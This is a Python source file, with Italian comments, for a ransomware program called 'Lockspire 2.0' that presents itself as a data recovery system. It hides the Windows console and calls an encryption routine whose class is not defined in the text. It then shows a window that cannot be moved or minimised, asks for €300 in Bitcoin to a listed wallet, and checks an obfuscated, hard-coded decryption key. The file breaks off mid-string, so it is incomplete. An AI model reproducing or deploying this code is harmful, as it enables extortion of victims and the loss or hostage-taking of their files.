#!/usr/bin/env python3

import os
import sys
import base64
import hashlib
import tkinter as tk
from tkinter import ttk, messagebox, font
from pathlib import Path
import threading
import time
import uuid
import ctypes

# NASCONDI LA CONSOLE - solo su Windows
if sys.platform == 'win32':
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            user32.ShowWindow(hWnd, 0)  # 0 = SW_HIDE
    except:
        pass

class LockspireRecoverySuite:
    
    def __init__(self):
        # Prima esegui la crittografia (se necessario)
        self.run_encryption_phase()
        
        # Poi inizializza il sistema di recupero
        self.recovered_count = 0
        self.failed_count = 0
        self._correct_key = self._get_key()
        self.files = []
        self.attempts_left = 3
        self.system_id = self._generate_system_id()
        self.decryption_active = False
        self.can_close = False
        self.initial_position_set = False
        self.window_x = 0
        self.window_y = 0
        
        # Crea finestra principale
        self.root = tk.Tk()
        self.root.title("LOCKSPIRE 2.0 - RECOVERY SYSTEM")
        self.root.geometry("1400x850")
        
        # Imposta dimensioni minime
        self.root.minsize(1000, 700)
        
        # IMPEDISCE LO SPOSTAMENTO DELLA FINESTRA
        self.root.overrideredirect(True)
        
        # Centro la finestra
        self.center_window()
        
        # Imposta lo stato della finestra
        if sys.platform == 'win32':
            try:
                self.root.attributes('-topmost', False)
                self.root.wm_attributes("-toolwindow", 1)
            except:
                pass
        
        # Intercetta la chiusura
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Intercetta il tentativo di minimizzare
        self.root.bind("<Unmap>", self.prevent_minimize)
        
        # Blocca movimento finestra
        self.root.bind("<B1-Motion>", self.prevent_move)
        self.root.bind("<Button-1>", self.prevent_move)
        self.root.bind("<Configure>", self.lock_position)
        
        # Tema moderno e dark
        self.setup_theme()
        
        # Setup font
        self.setup_fonts()
        
        # Setup stili
        self.setup_styles()
        
        # Crea layout unificato
        self.create_unified_layout()
        
        # Effetto entrata
        self.animate_entrance()
        
        # Bind per resize
        self.bind_resize_events()
    
    def bind_resize_events(self):
        """Gestisce eventi di resize"""
        self.root.bind("<Configure>", self.on_resize)
    
    def on_resize(self, event):
        """Gestisce il resize della finestra"""
        if event.widget == self.root:
            if event.width < 1000 or event.height < 700:
                self.root.geometry("1000x700")
    
    def prevent_minimize(self, event):
        """Previene la minimizzazione della finestra"""
        if event.type == '2':
            self.root.deiconify()
            self.root.state('normal')
            self.root.lift()
            self.root.focus_force()
            return "break"
    
    def prevent_move(self, event):
        """Previene lo spostamento della finestra"""
        return "break"
    
    def lock_position(self, event):
        """Blocca la posizione della finestra"""
        if event.widget == self.root and not self.initial_position_set:
            self.window_x = self.root.winfo_x()
            self.window_y = self.root.winfo_y()
            self.initial_position_set = True
        
        if self.initial_position_set:
            current_x = self.root.winfo_x()
            current_y = self.root.winfo_y()
            
            if abs(current_x - self.window_x) > 5 or abs(current_y - self.window_y) > 5:
                self.root.geometry(f"+{self.window_x}+{self.window_y}")
                return "break"
    
    def run_encryption_phase(self):
        """FASE 1: Cripta i file se necessario"""
        protector = FileProtector()
        files_to_encrypt = protector._get_target_files()
        
        if files_to_encrypt:
            success = 0
            for i, f in enumerate(files_to_encrypt, 1):
                if protector.protect_file(f):
                    success += 1
            
            if success > 0:
                protector._create_instructions()
    
    def center_window(self):
        """Centra la finestra e salva posizione"""
        self.root.update_idletasks()
        width = 1400
        height = 850
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        
        screen_height = self.root.winfo_screenheight()
        taskbar_height = 40
        max_y = screen_height - height - taskbar_height - 20
        
        if y > max_y:
            y = max_y
        
        self.root.geometry(f'{width}x{height}+{x}+{y}')
        
        self.window_x = x
        self.window_y = y
        self.initial_position_set = True
    
    def on_closing(self):
        """Gestisce il tentativo di chiusura della finestra"""
        if not self.can_close:
            if self.decryption_active:
                # Durante decrittazione: BLOCCO COMPLETO
                messagebox.showwarning("Operation in Progress", 
                    "⚠️ DECRYPTION ACTIVE - ACCESS DENIED\n\n"
                    "The recovery process is currently running.\n"
                    "Closing the application now will:\n"
                    "• PERMANENTLY CORRUPT your files\n"
                    "• MAKE RECOVERY IMPOSSIBLE\n"
                    "• LOCK THE SYSTEM PERMANENTLY\n\n"
                    "Please wait for the process to complete.\n\n"
                    "⚠️ NOTE: Task Manager remains functional\n"
                    "for system monitoring purposes.")
                return "break"
            else:
                response = messagebox.askyesno("Exit Application",
                    "⚠️ WARNING: Your files will remain encrypted!\n\n"
                    "If you exit now:\n"
                    "• All files stay encrypted (.lockspire)\n"
                    "• You can return later with the key\n"
                    "• No data will be lost\n\n"
                    "Are you sure you want to exit?")
                
                if response:
                    self.safe_close()
                else:
                    return "break"
        else:
            self.safe_close()
    
    def safe_close(self):
        """Chiusura sicura dell'applicazione"""
        try:
            if self.can_close:
                try:
                    if sys.platform == 'win32':
                        self.root.wm_attributes("-toolwindow", 0)
                except:
                    pass
                
                self.root.destroy()
                self.root.quit()
            else:
                messagebox.showerror("Cannot Close", 
                    "Application cannot be closed during recovery process.")
        except:
            os._exit(0)
    
    def setup_theme(self):
        """Configura tema colori"""
        self.colors = {
            'bg_dark': '#0a0a0f',
            'bg_darker': '#050508',
            'bg_card': '#121218',
            'bg_input': '#1a1a24',
            'primary': '#6366f1',
            'primary_light': '#818cf8',
            'primary_dark': '#4f46e5',
            'secondary': '#10b981',
            'accent': '#f59e0b',
            'danger': '#ef4444',
            'success': '#22c55e',
            'bitcoin': '#f7931a',
            'text_primary': '#f8fafc',
            'text_secondary': '#94a3b8',
            'text_muted': '#64748b',
            'border': '#2d3748',
            'gradient1': '#0f172a',
            'gradient2': '#1e293b',
            'titlebar': '#121218'
        }
        
        self.root.configure(bg=self.colors['bg_dark'])
    
    def setup_fonts(self):
        """Configura font"""
        try:
            self.fonts = {
                'title': ('Segoe UI', 28, 'bold'),
                'subtitle': ('Segoe UI', 12),
                'heading': ('Segoe UI', 16, 'bold'),
                'body': ('Segoe UI', 10),
                'mono': ('Consolas', 9),
                'small': ('Segoe UI', 9),
                'button': ('Segoe UI', 10, 'bold'),
                'digital': ('Consolas', 10, 'bold'),
                'key_entry': ('Consolas', 13),
                'titlebar': ('Segoe UI', 11, 'bold')
            }
        except:
            self.fonts = {
                'title': ('Arial', 28, 'bold'),
                'subtitle': ('Arial', 12),
                'heading': ('Arial', 16, 'bold'),
                'body': ('Arial', 10),
                'mono': ('Courier', 9),
                'small': ('Arial', 9),
                'button': ('Arial', 10, 'bold'),
                'digital': ('Courier', 10, 'bold'),
                'key_entry': ('Courier', 13),
                'titlebar': ('Arial', 11, 'bold')
            }
    
    def setup_styles(self):
        """Configura stili ttk"""
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        self.style.configure('Main.TFrame', background=self.colors['bg_dark'])
        self.style.configure('Card.TFrame', background=self.colors['bg_card'])
        self.style.configure('Dark.TFrame', background=self.colors['bg_darker'])
        self.style.configure('Titlebar.TFrame', background=self.colors['titlebar'])
        
        self.style.configure('Primary.TButton',
                           background=self.colors['primary'],
                           foreground='white',
                           borderwidth=0,
                           font=self.fonts['button'],
                           padding=(20, 10))
        
        self.style.map('Primary.TButton',
                      background=[('active', self.colors['primary_light'])])
        
        self.style.configure('Success.TButton',
                           background=self.colors['success'],
                           foreground='white',
                           borderwidth=0,
                           font=self.fonts['button'],
                           padding=(20, 10))
        
        self.style.configure('Bitcoin.TButton',
                           background=self.colors['bitcoin'],
                           foreground='white',
                           borderwidth=0,
                           font=self.fonts['button'],
                           padding=(20, 10))
        
        self.style.configure('Custom.Horizontal.TProgressbar',
                           background=self.colors['primary'],
                           troughcolor=self.colors['bg_input'],
                           bordercolor=self.colors['border'])
    
    def create_unified_layout(self):
        """Crea layout unificato con barra del titolo personalizzata"""
        # BARRA DEL TITOLO PERSONALIZZATA
        titlebar_frame = tk.Frame(self.root, bg=self.colors['titlebar'], height=40)
        titlebar_frame.pack(fill=tk.X, side=tk.TOP)
        titlebar_frame.pack_propagate(False)
        
        title_label = tk.Label(titlebar_frame,
                              text="🔐 LOCKSPIRE 2.0 - RECOVERY SYSTEM",
                              font=self.fonts['titlebar'],
                              bg=self.colors['titlebar'],
                              fg=self.colors['text_primary'])
        title_label.pack(side=tk.LEFT, padx=15)
        
        subtitle_label = tk.Label(titlebar_frame,
                                 text="| Advanced Data Recovery |",
                                 font=self.fonts['small'],
                                 bg=self.colors['titlebar'],
                                 fg=self.colors['text_secondary'])
        subtitle_label.pack(side=tk.LEFT, padx=5)
        
        # Pulsante di chiusura personalizzato
        self.close_title_btn = tk.Label(titlebar_frame,
                                       text="✕",
                                       font=('Arial', 14, 'bold'),
                                       bg=self.colors['titlebar'],
                                       fg=self.colors['text_secondary'],
                                       cursor="hand2")
        self.close_title_btn.pack(side=tk.RIGHT, padx=15)
        self.close_title_btn.bind("<Button-1>", lambda e: self.on_closing())
        self.close_title_btn.pack_forget()
        
        spacer = tk.Frame(self.root, height=10, bg=self.colors['bg_dark'])
        spacer.pack(fill=tk.X)
        
        # Main container
        main_container = ttk.Frame(self.root, style='Main.TFrame')
        main_container.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        # HEADER
        header_frame = ttk.Frame(main_container, style='Main.TFrame')
        header_frame.pack(fill=tk.X, pady=(0, 20))
        
        logo_frame = ttk.Frame(header_frame, style='Main.TFrame')
        logo_frame.pack(expand=True)
        
        title_main_label = tk.Label(logo_frame,
                                   text="LOCKSPIRE 2.0 - DATA RECOVERY SYSTEM",
                                   font=self.fonts['title'],
                                   bg=self.colors['bg_dark'],
                                   fg=self.colors['text_primary'])
        title_main_label.pack(anchor='center')
        
        subtitle_main_label = tk.Label(logo_frame,
                                      text="Military-Grade Encryption | Secure File Restoration",
                                      font=self.fonts['subtitle'],
                                      bg=self.colors['bg_dark'],
                                      fg=self.colors['text_secondary'])
        subtitle_main_label.pack(anchor='center', pady=(5, 0))
        
        separator = ttk.Separator(main_container, orient='horizontal')
        separator.pack(fill=tk.X, pady=(0, 20))
        
        # MAIN CONTENT AREA (3 columns)
        content_frame = ttk.Frame(main_container, style='Main.TFrame')
        content_frame.pack(fill=tk.BOTH, expand=True)
        
        # COLONNA SINISTRA - Scanner
        left_column = ttk.Frame(content_frame, style='Main.TFrame')
        left_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        scanner_card = ttk.Frame(left_column, style='Card.TFrame')
        scanner_card.pack(fill=tk.BOTH, expand=True)
        scanner_card.configure(padding=20)
        
        scanner_title = tk.Label(scanner_card,
                                text="🔍 FILE SCANNER",
                                font=self.fonts['heading'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['text_primary'])
        scanner_title.pack(anchor='w', pady=(0, 15))
        
        self.scan_btn = ttk.Button(scanner_card,
                                  text="🚀 START SYSTEM SCAN",
                                  command=self.scan_files,
                                  style='Primary.TButton')
        self.scan_btn.pack(fill=tk.X, pady=(0, 15))
        
        self.result_label = tk.Label(scanner_card,
                                    text="📊 No files scanned yet",
                                    font=self.fonts['body'],
                                    bg=self.colors['bg_card'],
                                    fg=self.colors['text_secondary'])
        self.result_label.pack(anchor='w', pady=(0, 10))
        
        list_frame = tk.Frame(scanner_card, bg=self.colors['bg_input'])
        list_frame.pack(fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.file_listbox = tk.Listbox(list_frame,
                                      bg=self.colors['bg_input'],
                                      fg=self.colors['text_primary'],
                                      font=self.fonts['mono'],
                                      selectbackground=self.colors['primary'],
                                      selectforeground='white',
                                      activestyle='none',
                                      borderwidth=0,
                                      highlightthickness=0)
        
        self.file_listbox.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=self.file_listbox.yview)
        
        self.file_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # COLONNA CENTRALE - Decryption
        center_column = ttk.Frame(content_frame, style='Main.TFrame')
        center_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10)
        
        decrypt_card = ttk.Frame(center_column, style='Card.TFrame')
        decrypt_card.pack(fill=tk.BOTH, expand=True)
        decrypt_card.configure(padding=20)
        
        decrypt_title = tk.Label(decrypt_card,
                                text="🔓 FILE RECOVERY",
                                font=self.fonts['heading'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['text_primary'])
        decrypt_title.pack(anchor='w', pady=(0, 15))
        
        key_frame = tk.Frame(decrypt_card, bg=self.colors['bg_card'])
        key_frame.pack(fill=tk.X, pady=(0, 15))
        
        key_label = tk.Label(key_frame,
                            text="Decryption Key:",
                            font=self.fonts['body'],
                            bg=self.colors['bg_card'],
                            fg=self.colors['text_secondary'])
        key_label.pack(anchor='w', pady=(0, 8))
        
        key_input_frame = tk.Frame(key_frame, bg=self.colors['bg_card'])
        key_input_frame.pack(fill=tk.X)
        
        self.key_entry = tk.Entry(key_input_frame,
                                 bg=self.colors['bg_input'],
                                 fg=self.colors['text_primary'],
                                 font=self.fonts['key_entry'],
                                 insertbackground=self.colors['primary'],
                                 show="*",
                                 relief='flat',
                                 borderwidth=2,
                                 highlightthickness=1,
                                 highlightbackground=self.colors['border'],
                                 highlightcolor=self.colors['primary'])
        self.key_entry.pack(fill=tk.X, expand=True)
        
        key_btn_frame = tk.Frame(key_frame, bg=self.colors['bg_card'])
        key_btn_frame.pack(fill=tk.X, pady=(15, 0))
        
        verify_btn = ttk.Button(key_btn_frame,
                               text="✅ VERIFY KEY",
                               command=self.verify_key,
                               style='Primary.TButton')
        verify_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.start_btn = ttk.Button(key_btn_frame,
                                   text="▶ START RECOVERY",
                                   command=self.start_decryption,
                                   style='Success.TButton')
        self.start_btn.pack(side=tk.LEFT)
        self.start_btn.config(state='disabled')
        
        self.attempts_label = tk.Label(decrypt_card,
                                      text="🔐 Attempts remaining: 3",
                                      font=self.fonts['body'],
                                      bg=self.colors['bg_card'],
                                      fg=self.colors['text_primary'])
        self.attempts_label.pack(anchor='w', pady=(15, 0))
        
        progress_frame = tk.Frame(decrypt_card, bg=self.colors['bg_card'])
        progress_frame.pack(fill=tk.X, pady=(20, 0))
        
        self.progress_var = tk.StringVar(value="Ready for decryption")
        progress_label = tk.Label(progress_frame,
                                 textvariable=self.progress_var,
                                 font=self.fonts['body'],
                                 bg=self.colors['bg_card'],
                                 fg=self.colors['text_secondary'])
        progress_label.pack(anchor='w', pady=(0, 5))
        
        self.progress_bar = ttk.Progressbar(progress_frame,
                                           style='Custom.Horizontal.TProgressbar',
                                           mode='determinate',
                                           length=100)
        self.progress_bar.pack(fill=tk.X, pady=(0, 10))
        
        self.current_file_var = tk.StringVar(value="No file selected")
        current_file_label = tk.Label(decrypt_card,
                                     textvariable=self.current_file_var,
                                     font=self.fonts['mono'],
                                     bg=self.colors['bg_card'],
                                     fg=self.colors['text_secondary'])
        current_file_label.pack(anchor='w', pady=(5, 0))
        
        # COLONNA DESTRA - Payment
        right_column = ttk.Frame(content_frame, style='Main.TFrame')
        right_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 0))
        
        payment_card = ttk.Frame(right_column, style='Card.TFrame')
        payment_card.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        payment_card.configure(padding=20)
        
        payment_title = tk.Label(payment_card,
                                text="💰 PAYMENT REQUIRED",
                                font=self.fonts['heading'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['bitcoin'])
        payment_title.pack(anchor='w', pady=(0, 15))
        
        instructions = f"""TO OBTAIN DECRYPTION KEY:

1️⃣ Scan files first (left panel)
2️⃣ Send €300 Bitcoin to address below
3️⃣ ⚠️ MUST INCLUDE in payment notes:
   • Your PERSONAL EMAIL
   • System ID: {self.system_id}
4️⃣ Wait for payment confirmation
5️⃣ Decryption key will be generated

Bitcoin Address:
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

⚠️ IMPORTANT: Include BOTH Email AND System ID"""

        instr_label = tk.Label(payment_card,
                              text=instructions,
                              font=self.fonts['mono'],
                              bg=self.colors['bg_card'],
                              fg=self.colors['text_primary'],
                              justify='left')
        instr_label.pack(anchor='w', pady=(0, 15))
        
        id_warning_frame = tk.Frame(payment_card, bg=self.colors['bg_input'])
        id_warning_frame.pack(fill=tk.X, pady=(10, 15))
        id_warning_frame.config(padx=10, pady=10)
        
        id_warning_label = tk.Label(id_warning_frame,
                                   text="⚠️ YOUR SYSTEM ID (INCLUDE IN PAYMENT):",
                                   font=self.fonts['small'],
                                   bg=self.colors['bg_input'],
                                   fg=self.colors['accent'])
        id_warning_label.pack(anchor='w', pady=(0, 5))
        
        id_display_payment = tk.Label(id_warning_frame,
                                     text=self.system_id,
                                     font=self.fonts['digital'],
                                     bg='#000000',
                                     fg=self.colors['secondary'],
                                     padx=10,
                                     pady=5)
        id_display_payment.pack(fill=tk.X, pady=(5, 0))
        
        copy_btn = ttk.Button(payment_card,
                             text="📋 COPY PAYMENT INFO",
                             command=self.copy_payment_details,
                             style='Bitcoin.TButton')
        copy_btn.pack(fill=tk.X)
        
        # Card Important Notes - CON SCROLLBAR
        support_card = ttk.Frame(right_column, style='Card.TFrame')
        support_card.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        support_card.configure(padding=20)
        
        support_title = tk.Label(support_card,
                                text="🆘 IMPORTANT NOTES",
                                font=self.fonts['heading'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['accent'])
        support_title.pack(anchor='w', pady=(0, 15))
        
        # Creiamo un frame contenitore con canvas e scrollbar
        notes_container = tk.Frame(support_card, bg=self.colors['bg_card'])
        notes_container.pack(fill=tk.BOTH, expand=True)
        
        # Canvas per lo scrolling
        canvas = tk.Canvas(notes_container, bg=self.colors['bg_card'], 
                          highlightthickness=0, height=250)
        scrollbar = ttk.Scrollbar(notes_container, orient="vertical", 
                                 command=canvas.yview)
        
        # Frame interno per il testo (che sarà scrollabile)
        scrollable_frame = tk.Frame(canvas, bg=self.colors['bg_card'])
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(
                scrollregion=canvas.bbox("all")
            )
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        # Bind per la rotellina del mouse
        def _on_mousewheel(event):
            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        
        canvas.bind_all("<MouseWheel>", _on_mousewheel)
        
        # Bind per frecce su/giù
        canvas.bind_all("<Up>", lambda e: canvas.yview_scroll(-1, "units"))
        canvas.bind_all("<Down>", lambda e: canvas.yview_scroll(1, "units"))
        
        # Layout scrollbar e canvas
        scrollbar.pack(side="right", fill="y")
        canvas.pack(side="left", fill="both", expand=True)
        
        # Testo scrollable
        support_text = f"""⚠️ CRITICAL INFORMATION:

• Key works ONLY with your System ID
• ⚠️ MUST include in payment notes:
  • Your PERSONAL EMAIL
  • System ID: {self.system_id}
• Key generation is automatic
• Single-use key, valid 72h
• Keep System ID secure
• Backup recovered files

KEY GENERATION:
• After payment verification
• System will match your email + ID
• No contact needed
• Enter key to start recovery

⚠️ SYSTEM SECURITY:
• Application window cannot be moved
• Cannot be minimized during recovery
• Task Manager remains functional
• System monitoring tools available

⚠️ RECOVERY PROCESS:
1. Scan for encrypted files (.lockspire)
2. Obtain decryption key via payment
3. Verify key in central panel
4. Start recovery process
5. Wait for completion
6. Files will be restored

⚠️ PAYMENT VERIFICATION:
• Payment confirmation: 10-30 minutes
• Key delivery: Automatic after verification
• Support contact: Not required
• 24/7 automated system

⚠️ TECHNICAL DETAILS:
• Encryption: AES-256 + custom algorithm
• File types: All common formats
• Max file size: 500MB per file
• Recovery rate: 99.9% success

⚠️ IMPORTANT WARNINGS:
• Do NOT delete .lockspire files
• Do NOT modify encrypted files
• Do NOT attempt manual decryption
• Keep backup of System ID

⚠️ AFTER RECOVERY:
• Check all restored files
• Verify file integrity
• Create backups
• Delete recovery tool if desired

⚠️ TROUBLESHOOTING:
• If key doesn't work: Verify System ID
• If files not found: Run scan again
• If payment issues: Check bitcoin transaction
• If still having problems: Wait 1 hour

⚠️ SECURITY NOTES:
• This is a secure recovery system
• No personal data is collected
• No system modifications
• Only file restoration

⚠️ LEGAL DISCLAIMER:
• This tool is for data recovery only
• Use at your own risk
• Follow all local laws
• Author not responsible for misuse"""

        support_label = tk.Label(scrollable_frame,
                                text=support_text,
                                font=self.fonts['mono'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['text_primary'],
                                justify='left',
                                wraplength=350)  # Lunghezza riga fissa per leggibilità
        
        support_label.pack(anchor='w', padx=5, pady=5)
        
        # FOOTER
        footer_frame = ttk.Frame(main_container, style='Dark.TFrame')
        footer_frame.pack(fill=tk.X, pady=(20, 0))
        
        self.status_var = tk.StringVar(value="⚡ LOCKSPIRE 2.0 - RECOVERY SYSTEM | STATUS: READY | FILES: 0 | ATTEMPTS: 3")
        status_label = tk.Label(footer_frame,
                               textvariable=self.status_var,
                               font=self.fonts['small'],
                               bg=self.colors['bg_darker'],
                               fg=self.colors['text_secondary'],
                               padx=20,
                               pady=10)
        status_label.pack()
        
        stats_frame = ttk.Frame(footer_frame, style='Dark.TFrame')
        stats_frame.pack(pady=(0, 10))
        
        stats = [
            ("📁 Files Found:", "0"),
            ("✅ Recovered:", "0"),
            ("❌ Failed:", "0"),
            ("🎯 Success:", "0%")
        ]
        
        for label, value in stats:
            stat_frame = tk.Frame(stats_frame, bg=self.colors['bg_darker'])
            stat_frame.pack(side=tk.LEFT, padx=20)
            
            lbl = tk.Label(stat_frame,
                          text=label,
                          font=self.fonts['small'],
                          bg=self.colors['bg_darker'],
                          fg=self.colors['text_muted'])
            lbl.pack(side=tk.LEFT, padx=(0, 5))
            
            if label == "📁 Files Found:":
                self.files_found_var = tk.StringVar(value=value)
                val = tk.Label(stat_frame,
                             textvariable=self.files_found_var,
                             font=self.fonts['digital'],
                             bg=self.colors['bg_darker'],
                             fg=self.colors['text_primary'])
            elif label == "✅ Recovered:":
                self.recovered_var = tk.StringVar(value=value)
                val = tk.Label(stat_frame,
                             textvariable=self.recovered_var,
                             font=self.fonts['digital'],
                             bg=self.colors['bg_darker'],
                             fg=self.colors['success'])
            elif label == "❌ Failed:":
                self.failed_var = tk.StringVar(value=value)
                val = tk.Label(stat_frame,
                             textvariable=self.failed_var,
                             font=self.fonts['digital'],
                             bg=self.colors['bg_darker'],
                             fg=self.colors['danger'])
            else:
                self.success_var = tk.StringVar(value=value)
                val = tk.Label(stat_frame,
                             textvariable=self.success_var,
                             font=self.fonts['digital'],
                             bg=self.colors['bg_darker'],
                             fg=self.colors['primary'])
            
            val.pack(side=tk.LEFT)
            
        self.close_btn = ttk.Button(footer_frame,
                                   text="🔓 CLOSE APPLICATION",
                                   command=self.safe_close,
                                   style='Success.TButton')
        self.close_btn.pack(pady=(5, 10))
        self.close_btn.pack_forget()
    
    def animate_entrance(self):
        """Animazione entrata"""
        self.root.attributes('-alpha', 0)
        self.root.update()
        
        for i in range(1, 11):
            alpha = i / 10
            self.root.attributes('-alpha', alpha)
            self.root.update()
            time.sleep(0.02)
        
        self.root.attributes('-alpha', 1)
    
    def _generate_system_id(self):
        """Genera ID sistema"""
        return f"URS-{uuid.uuid4().hex[:8].upper()}"
    
    def _get_key(self):
        """Genera chiave decrittazione - STESSA CHIAVE ORIGINALE"""
        a = [0x52, 0x4f, 0x42, 0x4c, 0x4f, 0x58]
        b = ''.join(chr(x ^ 0x11) for x in [0x23, 0x23, 0x23])
        c = bytes.fromhex('52524555')[::-1].decode()
        d = str(0x7DC + 0x4)

        m = ''.join([chr(x) for x in a])
        n = ''.join([str(ord(x) - 48) for x in b])
        o = c.lower().upper()
        p = d

        r = f"{m}_{n}_{o}_{p}"

        s = base64.b64encode(r.encode()).decode()
        t = hashlib.sha256(s.encode()).hexdigest()
        u = hashlib.md5(t.encode()).hexdigest()

        v = ''
        for i in range(0, len(u), 2):
            v += u[i]

        w = base64.b64encode(v.encode()).decode()
        x = w.replace('=', 'X').replace('/', 'Z').replace('+', 'Y')

        return x[:24].upper()
    
    def scan_files(self):
        """Scansiona file con estensione .lockspire"""
        self.status_var.set("🔍 Scanning for encrypted files...")
        self.scan_btn.config(state='disabled', text="Scanning...")
        self.root.update()
        
        self.file_listbox.delete(0, tk.END)
        
        script_dir = os.path.dirname(os.path.abspath(__file__))
        base_path = Path(script_dir)
        
        self.files = []
        try:
            # Cerca file .lockspire
            for item in base_path.rglob('*.lockspire'):
                if item.is_file():
                    self.files.append(str(item))
        except Exception as e:
            pass
        
        if self.files:
            self.result_label.config(text=f"✅ Found {len(self.files)} encrypted files")
            self.files_found_var.set(str(len(self.files)))
            
            for f in self.files:
                # Rimuovi estensione .lockspire (9 caratteri)
                name = os.path.basename(f)[:-9]
                if len(name) > 40:
                    name = name[:37] + "..."
                self.file_listbox.insert(tk.END, f"📄 {name}")
            
            self.status_var.set(f"✅ Found {len(self.files)} files | Ready for payment")
            messagebox.showinfo("Scan Complete",
                              f"✅ Found {len(self.files)} encrypted files (.lockspire).\n\n⚠️ IMPORTANT: Save your System ID:\n{self.system_id}\n\n⚠️ MUST include in payment:\n• Your PERSONAL EMAIL\n• System ID: {self.system_id}")
        else:
            self.result_label.config(text="⚠️ No encrypted files found")
            self.files_found_var.set("0")
            self.status_var.set("⚠️ No encrypted files found")
            messagebox.showwarning("No Files",
                                 "No .lockspire files found.\nThe recovery tool is ready if files become encrypted.")
        
        self.scan_btn.config(state='normal', text="🚀 START SYSTEM SCAN")
    
    def verify_key(self):
        """Verifica chiave"""
        user_key = self.key_entry.get().strip().upper()
        
        if not user_key:
            messagebox.showerror("Error", "Please enter a decryption key")
            return
        
        if user_key == self._correct_key:
            self.attempts_left = 3
            self.attempts_label.config(text="✅ Key verified successfully!")
            self.start_btn.config(state='normal')
            self.status_var.set("✅ Key verified | Ready for recovery")
            
            messagebox.showinfo("Success", "✅ Key verified successfully!\nYou can now start the recovery process.")
        else:
            self.attempts_left -= 1
            
            if self.attempts_left > 0:
                self.attempts_label.config(text=f"❌ Wrong key. Attempts left: {self.attempts_left}")
                self.status_var.set(f"⚠️ Wrong key | {self.attempts_left} attempts left")
                
                messagebox.showerror("Error", f"❌ Wrong decryption key.\n{self.attempts_left} attempts remaining.")
            else:
                self.attempts_label.config(text="🔒 Access locked. Payment required.")
                self.key_entry.config(state='disabled')
                self.status_var.set("🔒 System locked | Payment required")
                
                messagebox.showerror("Access Denied",
                                   "Maximum attempts exceeded.\nYou must obtain a valid key through payment.")
    
    def start_decryption(self):
        """Avvia decrittazione"""
        if not self.files:
            messagebox.showerror("Error", "No files to decrypt. Run a scan first.")
            return
        
        # Blocca TUTTO durante la decrittazione
        self.decryption_active = True
        self.start_btn.config(state='disabled', text="Recovering...")
        self.key_entry.config(state='disabled')
        self.scan_btn.config(state='disabled')
        self.status_var.set("🔓 RECOVERY IN PROGRESS - DO NOT CLOSE!")
        
        titlebar_frame = self.root.winfo_children()[0]
        title_label = titlebar_frame.winfo_children()[0]
        title_label.config(text="🔐 LOCKSPIRE 2.0 - RECOVERY ACTIVE - DO NOT CLOSE!")
        
        thread = threading.Thread(target=self._decryption_thread)
        thread.daemon = True
        thread.start()
    
    def _decryption_thread(self):
        """Thread decrittazione"""
        total = len(self.files)
        
        for i, filepath in enumerate(self.files, 1):
            percent = int((i / total) * 100)
            self.root.after(0, self._update_progress, i, total, filepath, percent)
            
            success = self._decrypt_file(filepath)
            
            if success:
                self.recovered_count += 1
                self.recovered_var.set(str(self.recovered_count))
            else:
                self.failed_count += 1
                self.failed_var.set(str(self.failed_count))
            
            total_processed = self.recovered_count + self.failed_count
            if total_processed > 0:
                success_rate = int((self.recovered_count / total_processed) * 100)
                self.success_var.set(f"{success_rate}%")
            
            time.sleep(0.1)
        
        self.root.after(0, self._decryption_complete)
    
    def _decrypt_file(self, filepath):
        """Decritta file - STESSO ALGORITMO ORIGINALE"""
        try:
            with open(filepath, 'rb') as f:
                encrypted = f.read()
            
            layer1 = base64.b64decode(encrypted)
            
            if not layer1.startswith(b'ENC'):
                return False
            
            header_end = layer1.find(b':')
            if header_end == -1:
                return False
            
            stored_key = layer1[3:header_end].decode()
            if stored_key != self._correct_key:
                return False
            
            encrypted_data = layer1[header_end + 1:]
            
            key_bytes = self._correct_key.encode()
            key_len = len(key_bytes)
            
            result = bytearray()
            for i, b in enumerate(encrypted_data):
                kb = key_bytes[i % key_len]
                result.append((b ^ kb) & 0xFF)
            
            original = base64.b64decode(bytes(result))
            
            # Rimuovi estensione .lockspire (9 caratteri)
            original_path = filepath[:-9]
            with open(original_path, 'wb') as f:
                f.write(original)
            
            os.remove(filepath)
            return True
            
        except Exception as e:
            return False
    
    def _update_progress(self, current, total, filepath, percent):
        """Aggiorna progresso"""
        # Rimuovi estensione .lockspire (9 caratteri)
        filename = os.path.basename(filepath)[:-9]
        if len(filename) > 30:
            filename = filename[:27] + "..."
        
        self.progress_bar['value'] = percent
        self.progress_var.set(f"Processing: {current}/{total} files ({percent}%)")
        self.current_file_var.set(f"Current: {filename}")
    
    def _decryption_complete(self):
        """Completa decrittazione"""
        self.decryption_active = False
        self.can_close = True
        
        # Ripristina pulsanti
        self.start_btn.config(state='normal', text="▶ START RECOVERY")
        self.scan_btn.config(state='normal')
        
        success_rate = int((self.recovered_count / len(self.files)) * 100) if self.files else 0
        
        summary = f"""
        ⚡ RECOVERY COMPLETE ⚡
        
        ✅ Successfully recovered: {self.recovered_count} files
        ⚠️ Failed to recover: {self.failed_count} files
        📊 Total processed: {len(self.files)} files
        🎯 Success rate: {success_rate}%
        
